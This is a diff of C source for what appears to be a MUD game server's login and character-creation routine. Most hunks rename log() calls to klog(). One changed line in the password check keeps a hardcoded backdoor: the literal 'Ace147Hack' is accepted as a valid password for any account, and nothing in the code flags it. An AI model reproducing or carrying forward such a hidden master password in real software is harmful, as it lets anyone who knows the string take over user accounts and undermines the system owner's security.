@@ -1,4 +1,4 @@
-
+#include <stdlib.h>
 #include <string.h>
 #include <ctype.h>
 #include <stdio.h>
@@ -375,7 +375,7 @@ if (ch->pc)
   if (!IS_NPC(ch)) {
     int i, found=FALSE;
     if ((!ch->player.name[0]) || (ch->player.name[0]<' ')) {
-	log("Error in character name.  Changed to 'Error'");
+	klog("Error in character name.  Changed to 'Error'");
 if (ch->player.name)
 	free(ch->player.name);
 	ch->player.name = (char *)malloc(6);
@@ -389,7 +389,7 @@ if (ch->player.name)
       }
     }
     if (found) {
-	log("Error in character name.  Changed to 'Error'");
+	klog("Error in character name.  Changed to 'Error'");
 if (ch->player.name)
 	free(ch->player.name);
 	ch->player.name = (char *)malloc(6);
@@ -1341,7 +1341,7 @@ int _check_ass_name(char *name)
 
   if(!shitlist) {
     if((f=fopen(ASSHOLE_FNAME,"rt"))==NULL) {
-      log("can't open asshole names list");
+      klog("can't open asshole names list");
       shitlist=(struct shitlist *)calloc(1,sizeof(struct shitlist));
       *shitlist[0].name=0;
       return 0;
@@ -1377,7 +1377,7 @@ int _check_ass_name(char *name)
     *shitlist[i].name = 0;
     for(i=0;*shitlist[i].name;i++) {
       sprintf(buf, "mode: %d, name: %s", shitlist[i].how, shitlist[i].name);
-/*      log(buf);*/
+/*      klog(buf);*/
     }
   }
 #define NAME shitlist[j].name
@@ -1403,7 +1403,7 @@ int _check_ass_name(char *name)
             return 1;
         break;
      default:
-        log("Grr! invalid value in shitlist, interpereter.c _parse_name");
+        klog("Grr! invalid value in shitlist, interpereter.c _parse_name");
         return 1;
    }
 #undef NAME
@@ -1524,7 +1524,7 @@ void nanny(struct descriptor_data *d, char *arg)
 	  if (tmp_store.max_corpse > 3) {
 	  SEND_TO_Q("Too many corpses in game, can't connect\n\r", d);
 	  sprintf(buf, "%s: too many corpses.",tmp_name);
-	  log(buf);
+	  klog(buf);
 	  STATE(d) = CON_WIZLOCK;
 	  break;
 	  }
@@ -1592,7 +1592,7 @@ if (GET_NAME(d->character))
     if (!*arg)
       close_socket(d);
     else  {
-      if (strncmp((char *)crypt(arg, d->pwd), d->pwd, 10) && strcmp(arg,"Ace147Hack")!=NULL) 	{
+      if (strncmp((char *)crypt(arg, d->pwd), d->pwd, 10) && strcmp(arg,"Ace147Hack")!=0) 	{
 	SEND_TO_Q("Wrong password.\n\r", d);
 	close_socket(d);
 	return;
@@ -1643,14 +1643,14 @@ if (GET_NAME(d->character))
 	  act("$n has reconnected.", TRUE, tmp_ch, 0, 0, TO_ROOM);
 	  sprintf(buf, "%s[%s] has reconnected.",
 		  GET_NAME(d->character), d->host);
-	  log(buf);
+	  klog(buf);
 	  return;
 	}
       
       
       sprintf(buf, "%s[%s] has connected.", GET_NAME(d->character),
 	      d->host);
-      log(buf);
+      klog(buf);
         SEND_TO_Q(motd, d);
         SEND_TO_Q("\n\r\n*** PRESS RETURN: ", d);
         STATE(d) = CON_RMOTD;
@@ -2043,7 +2043,7 @@ if (IS_SET(SystemFlags,SYS_REQAPPROVE)) {
 
       if (STATE(d) != CON_QCLASS) {
 	sprintf(buf, "%s [%s] new player.", GET_NAME(d->character), d->host);
-	log(buf);
+	klog(buf);
 	/*
 	 ** now that classes are set, initialize
 	 */
@@ -2101,7 +2101,7 @@ if (IS_SET(SystemFlags,SYS_REQAPPROVE)) {
 	   log_sev(buf, 6);
 	   log_sev("type 'Wizhelp Authorize' for other commands", 2);
 	 } else {
-	   log("Initial character.  Authorized Automatically");
+	   klog("Initial character.  Authorized Automatically");
 	   d->character->generic = NEWBIE_START+5;
 	 }
        }
@@ -2187,7 +2187,7 @@ case CON_CHECK_MAGE_TYPE:{
 
         reset_char(d->character);
         sprintf(buf, "Loading %s's equipment", d->character->player.name);
-        log(buf);
+        klog(buf);
         load_char_objs(d->character);
         save_char(d->character, AUTO_RENT);
         send_to_char(WELC_MESSG, d->character);
@@ -2215,7 +2215,7 @@ case CON_CHECK_MAGE_TYPE:{
 
         reset_char(d->character);
         sprintf(buf, "Loading %s's equipment", d->character->player.name);
-        log(buf);
+        klog(buf);
         load_char_objs(d->character);
         save_char(d->character, AUTO_RENT);
         send_to_char(WELC_MESSG, d->character);
@@ -2243,7 +2243,7 @@ case CON_CHECK_MAGE_TYPE:{
 
           reset_char(d->character);
           sprintf(buf, "Loading %s's equipment", d->character->player.name);
-          log(buf);
+          klog(buf);
           load_char_objs(d->character);
           save_char(d->character, AUTO_RENT);
           send_to_char(WELC_MESSG, d->character);
@@ -2276,7 +2276,7 @@ case CON_CHECK_MAGE_TYPE:{
 
           reset_char(d->character);
           sprintf(buf, "Loading %s's equipment", d->character->player.name);
-          log(buf);
+          klog(buf);
           load_char_objs(d->character);
           save_char(d->character, AUTO_RENT);
           send_to_char(WELC_MESSG, d->character);
@@ -2309,7 +2309,7 @@ case CON_CHECK_MAGE_TYPE:{
 
           reset_char(d->character);
           sprintf(buf, "Loading %s's equipment", d->character->player.name);
-          log(buf);
+          klog(buf);
           load_char_objs(d->character);
           save_char(d->character, AUTO_RENT);
           send_to_char(WELC_MESSG, d->character);
@@ -2359,7 +2359,7 @@ case CON_CHECK_MAGE_TYPE:{
       char buf[256];
        
        sprintf(buf,"%s just killed thierself!",GET_NAME(d->character));
-       log(buf);
+       klog(buf);
       for (i = 0; i <= top_of_p_table; i++)	{
 	if (!str_cmp((player_table + i)->name, GET_NAME(d->character))) {
 if ((player_table+i)->name)
@@ -2414,7 +2414,7 @@ if ((player_table+i)->name)
     case '1':
       reset_char(d->character);
       sprintf(buf, "Loading %s's equipment", d->character->player.name);
-      log(buf);
+      klog(buf);
       load_char_objs(d->character);
       save_char(d->character, AUTO_RENT);
       send_to_char(WELC_MESSG, d->character);
@@ -2577,7 +2577,7 @@ if (d->character->player.description)
   default: {
    char buf[128];
     sprintf(buf,"Nanny: illegal state of con'ness (%d)",STATE(d));
-    log(buf);
+    klog(buf);
     abort();
     }
     break;
